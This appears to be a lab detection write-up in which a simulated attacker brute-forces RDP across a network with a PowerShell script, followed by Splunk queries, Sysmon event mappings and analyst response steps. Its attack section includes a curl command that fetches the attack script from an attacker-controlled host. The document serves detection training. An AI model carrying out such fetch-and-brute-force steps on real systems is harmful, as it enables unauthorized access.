

# Detection Usecase 2 : Lateral Movement via Brute Force


# Scenario Summary: 

An Attacker has tried to logged in into the System by using credentials of a user and by that machine,  
attacker Brute Force other system on the network through RDP using a PowerShell Scripts.  

# Attack Steps:

Here, Virtual Windows 11 is the victim where universal forwarder is running,  
and Virtual Kali Linux is the attacker.
- The Attack was simulated by Kali Linux on Windows as follows: 

1) Attacker Login to Victim Machine via SSH and uploaded a PowerScript on it.  
```
ssh low@192.168.0.103
```  
```
curl http://192.168.0.106/RDP.ps1
```
2) Then executed the script to Brute Force other system.  

[To See the ps1 file ](scripts/RDP.ps1)

*******************************

- Tools Used:  
    - Attacking Tool : PowerShell Script, SSH 
    - SIEM : Splunk Free  
    - Log Source : Windows Security Event Logs, Sysmon


# Event ID / Data Source Mapping:

| Source                    | EventCode | Description                      |
|---------------------------|-----------|----------------------------------|
| WinEventLog : Security    | 4624      | Successful logon                 |
| WinEventLog : Sysmon      | 1         | Process Creation                 |
| WinEventLog : Sysmon      | 3         | Network Connection Detected      |
| WinEventLog : Sysmon      | 11        | File Creation                    |

# Detection Query / Logic:
```spl 
- Search - Finding N/W Connection through mstsc.exe
index=* EventCode=3 mstsc.exe | stats count by SourceIp, DestinationIp, EventCode
```
```spl 
- Search - Command Execution using Powershell 
index=* EventCode=1 mstsc.exe OR cmdkey.exe | stats count by host, EventCode, OriginalFileName, CommandLine
```

# Sample Alert Screenshot

1) User has logged in.  

![log in](<logs/Screenshot 2025-06-04 152041.png>)  
![login2](<logs/Screenshot 2025-06-04 153141.png>)

2) Then there was a Network Connection Detected to same IP and immediately a file was created.  

![file](<logs/Screenshot 2025-06-04 153716.png>)

3) After the file execution there was many request going to a known IP by the 'low' user using 'mstsc.exe'.  

![outbound](<logs/Screenshot 2025-06-04 153041.png>)

4) Many command were executed using 'cmdkey.exe'.  

![cmdkey](<logs/Screenshot 2025-06-04 152805.png>)

5) Also in the victim machine traffic are been captured coming to it via RDP.  

![wireshark](<logs/Screenshot 2025-06-04 151350.png>)

# Analyst Notes / Recommendations:

1) What Should an Analyst do ? 

-> Confirm the Detection - Verify logs and see the indicators(e.g., Cmd-Line, mstsc.exe)(e.g.,Event ID : 4625(unsuccessful login), 11(File Creation), 1(Process Creation/Command Execution)), try to correlate it with unexpected login.  
-> Contain the Threat - Isolate the system and stop any malicious runinng processes and disable the user account involved in the attack.  
-> Delete any downloaded files, check for scheduled tasks or any persistence mechanism.  
-> Collect the Evidence.  
-> Report & Document the incident & Improve.  

# Detection Status

 -> Successfully Detected.  
